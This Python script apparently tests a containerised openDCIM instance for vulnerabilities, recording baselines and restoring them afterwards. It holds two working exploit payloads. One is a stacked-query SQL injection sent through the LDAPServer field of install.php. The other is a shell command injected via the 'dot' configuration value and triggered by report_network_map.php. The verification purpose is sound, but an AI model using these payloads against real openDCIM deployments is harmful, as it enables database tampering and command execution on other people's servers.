from pathlib import Path
import base64
import hashlib
import json
import os
import shlex
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


class Native:
    LDAP = ['LDAPServer', 'LDAPBaseDN', 'LDAPBindDN', 'LDAPSessionExpiration', 'LDAPSiteAccess', 'LDAPReadAccess', 'LDAPWriteAccess', 'LDAPDeleteAccess', 'LDAPAdminOwnDevices', 'LDAPRackRequest', 'LDAPRackAdmin', 'LDAPContactAdmin', 'LDAPSiteAdmin']
    PROOF = '/tmp/module-target-opendcim-native'
    TABLE = 'module_target_dcim_native'

    def __init__(self, runtime, directory):
        self.runtime = runtime
        self.out = Path(directory)
        endpoint = runtime['endpoints']['target']
        self.url = 'http://' + endpoint['host'] + ':' + str(endpoint['port'])
        # The container installer legitimately returns 302 after handling POST.
        # Observe that response, as HttpClient does, without following its URL.
        self.client = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedirect())
        self.receipt = dict(http=[], commands=[], cases=[], module_invoked=False)

    def save(self):
        (self.out / 'native.json').write_text(json.dumps(self.receipt, indent=2) + '\n')

    def cli(self, action, data):
        argv = self.runtime['compose'] + ['exec', '-T', '-u', '33', 'target', 'php', '/opt/module-target-dcim-native.php', action]
        result = subprocess.run(argv, input=json.dumps(data).encode(), capture_output=True, timeout=30)
        self.receipt['commands'].append(dict(action=action, argv=argv, input=data, exit=result.returncode, stdout_base64=base64.b64encode(result.stdout).decode(), stderr=result.stderr.decode(errors='replace')))
        self.save()
        assert result.returncode == 0, result.stderr.decode(errors='replace')
        return json.loads(result.stdout)

    def query(self, sql, params=None):
        return self.cli('query', dict(sql=sql, params=params or []))['rows']

    def snapshot(self):
        return self.query('SELECT Parameter, Value, DefaultVal FROM fac_Config ORDER BY Parameter')

    def tables(self):
        return self.query('SHOW TABLES')

    def restore(self, rows):
        return self.cli('transaction', dict(queries=[dict(sql='UPDATE fac_Config SET Value=? WHERE Parameter=?', params=[row['Value'], row['Parameter']]) for row in rows]))

    def metadata(self):
        return self.cli('metadata', {})

    def file(self, path):
        return self.cli('file', dict(path=path))

    def remove(self, path):
        return self.cli('remove', dict(path=path))

    def http(self, path, form=None):
        data = None if form is None else urllib.parse.urlencode(form).encode()
        request = urllib.request.Request(self.url + path, data=data)
        try:
            response = self.client.open(request, timeout=15)
        except urllib.error.HTTPError as error:
            response = error
        with response:
            body = response.read()
            row = dict(path=path, method=request.get_method(), form=form, status=response.status, headers=dict(response.headers), body_base64=base64.b64encode(body).decode())
        self.receipt['http'].append(row)
        self.save()
        return row['status'], body

    def command_control(self, command, path, expected_base64, prefix=''):
        baseline = self.snapshot()
        assert self.file(path) == dict(exists=False)
        try:
            self.query('UPDATE fac_Config SET Value=? WHERE Parameter=?', [command + ' #', 'dot'])
            status, body = self.http(prefix + '/report_network_map.php?format=0&containerid=1')
            physical = self.file(path)
            assert status == 200 and physical == dict(exists=True, uid=33, base64=expected_base64), (status, physical, body[:500])
            result = dict(passed=True, label='native-dot-command', command_base64=base64.b64encode(command.encode()).decode(), prefix=prefix, physical=physical)
            self.receipt['cases'].append(result)
            return result
        finally:
            self.restore(baseline)
            assert self.remove(path) == dict(exists=False)
            assert self.snapshot() == baseline
            self.save()

    def verify(self):
        expected = json.loads(Path(__file__).with_name('vendor.json').read_text())
        original = None
        baseline = None
        try:
            before = self.metadata()
            self.receipt['vendor'] = before
            assert before['version'] == expected['version'] and before['php'] == expected['php'] and before['uid'] == 33 and before['sources'] == expected['sources'], before
            status, body = self.http('/install.php')
            assert status == 302 and urllib.parse.urlparse(self.receipt['http'][-1]['headers']['Location']).path.endswith('/index.php'), (status, body[:500])
            original = self.snapshot()
            self.receipt['factory_config'] = original
            self.receipt['database'] = self.query('SELECT VERSION() AS version, @@SESSION.sql_mode AS sql_mode, DATABASE() AS database_name, CURRENT_USER() AS principal_name')
            assert self.receipt['database'] == [dict(version=expected['database_version'], sql_mode='', database_name='dcim', principal_name='dcim@%')]
            table_baseline = self.tables()
            self.receipt['factory_tables'] = table_baseline
            assert len(original) == expected['configuration_rows']
            values = {name: 'cn=module-' + name.lower() + ',dc=example,dc=test' for name in self.LDAP}
            values.update(LDAPServer='ldap://directory.module-target.invalid', LDAPBaseDN='dc=example,dc=test', LDAPSessionExpiration='7200')
            self.cli('transaction', dict(queries=[dict(sql='UPDATE fac_Config SET Value=? WHERE Parameter=?', params=[value, key]) for key, value in values.items()]))
            baseline = self.snapshot()
            assert {row['Parameter']: row['Value'] for row in baseline if row['Parameter'] in self.LDAP} == values
            self.receipt['baseline'] = baseline
            self.receipt['tables'] = table_baseline
            status, body = self.http('/report_network_map.php?format=0&containerid=1')
            assert status == 200, (status, body[:500])
            document = ET.fromstring(body)
            assert document.tag == '{http://www.w3.org/2000/svg}svg', document.tag
            self.receipt['cases'].append(dict(label='ordinary-graphviz', svg=True, bytes=len(body)))
            form = dict(values, ldapaction='Set')
            form['LDAPServer'] = '" WHERE 1=0; CREATE TABLE ' + self.TABLE + ' (proof varchar(80)); INSERT INTO ' + self.TABLE + ' VALUES ("native-stacked-query"); -- '
            status, body = self.http('/install.php', form)
            assert status == 302, (status, body[:500])
            assert self.query('SELECT proof FROM ' + self.TABLE) == [dict(proof='native-stacked-query')]
            self.query('DROP TABLE ' + self.TABLE)
            assert self.snapshot() == baseline and self.tables() == table_baseline
            self.receipt['cases'].append(dict(label='native-stacked-sql', proof='native-stacked-query', configuration_preserved=True))
            marker = "Native 'single' \"double\" \\ Unicode雪\r\nEnd\n"
            command = 'printf %s ' + shlex.quote(marker) + ' > ' + self.PROOF
            self.command_control(command, self.PROOF, base64.b64encode(marker.encode()).decode())
            assert self.snapshot() == baseline and self.tables() == table_baseline
            after = self.metadata()
            assert after == before
            self.receipt['vendor_after'] = after
            self.receipt['passed'] = True
            return dict(passed=True, version=before['version'], uid=33, vendor=before, baseline=baseline, tables=table_baseline, factory_config=original)
        except BaseException as error:
            self.receipt['error'] = dict(type=type(error).__name__, message=str(error))
            raise
        finally:
            if baseline is not None:
                self.receipt['before_recovery'] = self.snapshot()
                self.restore(baseline)
                self.remove(self.PROOF)
                self.query('DROP TABLE IF EXISTS ' + self.TABLE)
                self.receipt['after_recovery'] = self.snapshot()
            self.save()


if __name__ == '__main__':
    runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
    artifacts = Path(runtime['artifacts'])
    action = sys.argv[1]
    directory = artifacts / ('opendcim-native' if action == 'before' else 'opendcim-' + action + '-' + str(time.time_ns()))
    directory.mkdir()
    native = Native(runtime, directory)
    state_path = artifacts / 'opendcim-state.json'
    try:
        if action == 'before':
            assert not state_path.exists()
            result = native.verify()
            state_path.write_text(json.dumps(result, indent=2) + '\n')
        else:
            state = json.loads(state_path.read_text())
            if action == 'snapshot':
                result = dict(config=native.snapshot(), tables=native.tables(), vendor=native.metadata())
            elif action in ['file', 'remove']:
                result = native.cli(action, dict(path=sys.argv[2]))
            elif action == 'command-control':
                result = native.command_control(base64.b64decode(sys.argv[2]).decode(), sys.argv[3], sys.argv[4], sys.argv[5])
            elif action == 'after':
                config = native.snapshot()
                tables = native.tables()
                native.receipt['before_fixture_recovery'] = dict(config=config, tables=tables)
                preserved = config == state['baseline'] and tables == state['tables']
                native.restore(state['factory_config'])
                assert native.snapshot() == state['factory_config']
                actual = native.metadata()
                assert actual == state['vendor']
                result = dict(restored=True, preserved=preserved, tables_unchanged=tables == state['tables'], vendor=actual)
            else:
                raise ValueError('Unknown native action: ' + action)
        native.receipt['result'] = result
        print(json.dumps(result))
    finally:
        native.save()
